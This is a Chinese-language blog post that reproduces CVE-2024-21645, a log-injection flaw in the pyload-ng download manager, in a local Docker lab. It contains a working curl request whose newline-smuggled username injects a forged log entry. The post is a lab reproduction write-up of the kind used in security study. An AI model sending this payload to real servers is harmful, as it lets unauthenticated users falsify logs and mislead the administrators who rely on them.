#  [漏洞复现]CVE-2024-21645   
原创 fgz  AI与网安   2024-01-14 00:02  
  
免  
责  
申  
明  
：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**  
  
****  
  
  
01  
  
—  
  
漏洞名称  
  
  
  
pyload日志注入漏洞  
  
  
  
02  
  
—  
  
漏洞影响  
  
  
pyload-ng < 0.5.0b3.dev76版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPJOHqibtRl2PmZYFOnCFXRhfFVt8CiaiaWUXwWSGhHbo1ODLlia0p9N5iaTp7mph7Q73m188scB3NnvFg/640?wx_fmt=png&from=appmsg "")  
  
  
  
03  
  
—  
  
漏洞描述  
  
  
pyload是一个  
用纯 Python 编写的免费开源下载管理器。有WEB页面，在页面上有个查看日志的功能，存在  
日志注入漏洞。此漏洞允许任何未经身份验证的参与者将任意消息注入到pyload。  
pyload尝试使用错误凭据登录时将生成日志条目。该条目将采用 的形式Login failed for user 'USERNAME'。但是，当提供包含换行符的用户名时，该换行符不会正确转义。换行符也是日志条目之间的分隔符。这允许攻击者将新的日志条目注入日志文件中。  
  
  
04  
  
—  
  
靶场搭建  
  
  
  
方便期间直接使用docker搭建靶场  
```
docker search pyload
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPJOHqibtRl2PmZYFOnCFXRhVag4iaR3bSIt1Y5icGicgTgciarecVR1yickAia9U84RIqwa3dZ1aFwSbCiaw/640?wx_fmt=png&from=appmsg "")  
```
docker pull linuxserver/pyload-ng
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPJOHqibtRl2PmZYFOnCFXRhxuhfFSibdEydukQpSBB40wAD7xoBUwicHXOrlZhVhpnaUjKpTNQ66cibg/640?wx_fmt=png&from=appmsg "")  
  
  
启动容器  
```
docker run -p 8000:8000 linuxserver/pyload-ng
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPJOHqibtRl2PmZYFOnCFXRhsfUlpLG847PxXnicscKWxUB8adFmQkwBpXfPIXGqZibCFKNfwqqib5mcQ/640?wx_fmt=png&from=appmsg "")  
  
  
访问页面  
  
http://192.168.40.130:8000/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPJOHqibtRl2PmZYFOnCFXRhHOGLQFjQiaeN4ibIVJIIcbchECZp1Xeicj1ef8ef0TyURGYfVYpDpvuicQ/640?wx_fmt=png&from=appmsg "")  
  
至此靶场搭建完成  
  
  
  
  
05  
  
—  
  
漏洞复现  
  
  
先登录进去，然后查看日志  
  
pyload/pyload  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPJOHqibtRl2PmZYFOnCFXRhjyWpZ7czSWqpLuHiamJ16RheiacYtR8PxI3RPeibRI8YlacuXxtguwtCw/640?wx_fmt=png&from=appmsg "")  
  
  
任何未经身份验证的攻击者现在都可以发出以下请求来注入任意日志。我们在另一台kali虚拟机上执行如下命令  
```
curl 'http://192.168.40.130:8000/login?next=http://192.168.40.130:8000/' -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-raw $'do=login&username=wrong\'%0a[2024-01-05 02:49:19]  HACKER               PinkDraconian  THIS ENTRY HAS BEEN INJECTED&password=wrong&submit=Login'
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPJOHqibtRl2PmZYFOnCFXRh9I0Pet1N9BR6LmKzzPx2oU6ia1Yxu5k2EAobGd0rmwGGP3HghLduluA/640?wx_fmt=png&from=appmsg "")  
  
  
再次查看日志，我们会看到该条目已成功注入。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPJOHqibtRl2PmZYFOnCFXRh2ETsAGVqGdFjIYz5eVqfY2TtzuFTOJTYVxSTvzuLib35zibv9bZl9k7w/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞复现成功  
  
  
  
06  
  
—  
  
nuclei poc  
  
  
  
漏洞实用性不强，懒得写POC了。  
  
  
07  
  
—  
  
修复建议  
  
  
开源项目，自行修复。  
  
  
  
